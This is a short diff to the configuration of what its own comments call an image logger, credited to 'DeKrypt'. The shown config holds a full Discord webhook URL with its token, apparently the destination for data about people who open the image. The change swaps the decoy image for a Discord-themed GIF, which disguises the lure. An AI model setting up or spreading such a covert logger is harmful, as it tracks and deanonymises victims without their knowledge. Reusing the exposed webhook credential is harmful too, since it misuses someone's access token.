@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1459901212114550968/AbVuhEdgL536dEuzzXXVWQekWMbBjjuD0rm5jfZTK4y2jsoVxymcMMUls_E00dix4z4_",
-    "image": "https://chargeraccount.org/wp-content/uploads/2023/06/K7Kk3DSxN0r4AVhONa9ruggbas3DWRIrbnHw1dJc-1-900x600.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://media.tenor.com/s7ZEJ3qrmSEAAAAM/discord.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
 
     # CUSTOMIZATION #
